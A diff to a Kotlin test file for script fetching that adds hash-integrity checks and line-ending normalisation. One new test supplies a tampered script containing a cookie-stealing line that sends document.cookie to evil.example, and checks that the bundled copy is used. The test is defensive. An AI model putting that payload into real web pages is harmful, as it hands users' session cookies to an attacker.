@@ -34,7 +34,12 @@ class FetchScriptsTest {
     private val scriptA = Script(isEnabled = true, resourceId = 1, scriptTitle = "a.js")
     private val scriptB = Script(isEnabled = true, resourceId = 2, scriptTitle = "b.js")
 
-    private fun fallbackFor(resourceId: Int) = "fallback-$resourceId"
+    // Bundled copies use LF and the network copies below use CRLF: they hash
+    // the same (line endings are normalised), but the result still shows
+    // which copy was used.
+    private fun fallbackFor(resourceId: Int) = "content-${'a' + resourceId - 1}\n"
+    private val networkA = "content-a\r\n"
+    private val networkB = "content-b\r\n"
 
     private fun clientRespondingWith(
         bodies: Map<String, String> = emptyMap(),
@@ -56,11 +61,32 @@ class FetchScriptsTest {
 
     @Test
     fun returnsNetworkContent_onSuccess() = runBlocking {
-        val client = clientRespondingWith(bodies = mapOf("a.js" to "network-a"))
+        val client = clientRespondingWith(bodies = mapOf("a.js" to networkA))
 
         val result = fetchScripts(listOf(scriptA), ::fallbackFor, client)
 
-        assertEquals("network-a", result)
+        assertEquals(networkA, result)
+    }
+
+    @Test
+    fun rejectsFetchedScript_whoseHashDoesNotMatchBundledCopy() = runBlocking {
+        val client = clientRespondingWith(
+            bodies = mapOf("a.js" to "content-a\nfetch('https://evil.example/'+document.cookie)\n")
+        )
+
+        val result = fetchScripts(listOf(scriptA), ::fallbackFor, client)
+
+        assertEquals(fallbackFor(1), result)
+    }
+
+    @Test
+    fun scriptSha256_ignoresLineEndings() {
+        assertEquals(scriptSha256("a\nb\n"), scriptSha256("a\r\nb\r\n"))
+        assertEquals(
+            // sha256("abc")
+            "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad",
+            scriptSha256("abc")
+        )
     }
 
     @Test
@@ -75,7 +101,7 @@ class FetchScriptsTest {
     @Test
     fun fallsBackToBundled_whenFetchExceedsTimeout() = runBlocking {
         val client = clientRespondingWith(
-            bodies = mapOf("a.js" to "network-a"),
+            bodies = mapOf("a.js" to networkA),
             delays = mapOf("a.js" to FETCH_TIMEOUT_MS + 500)
         )
 
@@ -94,13 +120,13 @@ class FetchScriptsTest {
         // the timeout) - the concatenated result must still read a-then-b,
         // matching the order the caller listed them in, not completion order.
         val client = clientRespondingWith(
-            bodies = mapOf("a.js" to "content-a", "b.js" to "content-b"),
+            bodies = mapOf("a.js" to networkA, "b.js" to networkB),
             delays = mapOf("a.js" to 200L)
         )
 
         val result = fetchScripts(listOf(scriptA, scriptB), ::fallbackFor, client)
 
-        assertEquals("content-acontent-b", result)
+        assertEquals(networkA + networkB, result)
     }
 
     @Test
@@ -114,7 +140,7 @@ class FetchScriptsTest {
         // directly, to avoid a flaky test.
         val perScriptDelay = FETCH_TIMEOUT_MS - 200
         val client = clientRespondingWith(
-            bodies = mapOf("a.js" to "content-a", "b.js" to "content-b"),
+            bodies = mapOf("a.js" to networkA, "b.js" to networkB),
             delays = mapOf("a.js" to perScriptDelay, "b.js" to perScriptDelay)
         )
 
@@ -122,7 +148,7 @@ class FetchScriptsTest {
 
         assertEquals(
             "both fetches should succeed within roughly one timeout window if run concurrently",
-            "content-acontent-b",
+            networkA + networkB,
             result
         )
     }
@@ -130,11 +156,11 @@ class FetchScriptsTest {
     @Test
     fun skipsDisabledScripts() = runBlocking {
         val disabled = scriptB.copy(isEnabled = false)
-        val client = clientRespondingWith(bodies = mapOf("a.js" to "content-a", "b.js" to "content-b"))
+        val client = clientRespondingWith(bodies = mapOf("a.js" to networkA, "b.js" to networkB))
 
         val result = fetchScripts(listOf(scriptA, disabled), ::fallbackFor, client)
 
-        assertTrue(result.contains("content-a"))
+        assertTrue(result.contains(networkA))
         assertFalse(
             "disabled script must not be fetched or contribute fallback content",
             result.contains("content-b") || result.contains(fallbackFor(2))
